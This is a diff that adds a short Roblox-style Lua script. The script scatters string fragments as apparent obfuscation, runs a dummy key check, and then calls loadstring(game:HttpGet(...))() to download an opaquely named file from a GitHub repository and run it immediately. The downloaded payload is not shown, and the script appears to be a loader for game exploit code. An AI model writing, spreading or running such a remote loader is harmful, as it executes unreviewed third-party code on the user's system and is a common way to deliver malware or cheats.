@@ -1,0 +1,14 @@
+local kp1 = "PUB"
+local Kw = "KE"
+local qwe = "LI"
+local erg = "C"
+local und = "_"
+local riyg = "Y"
+
+
+if _G.Key == "aderh" then
+print("key test")
+end
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LUNR-Dev/LDR/main/sdfykjertyk'))()
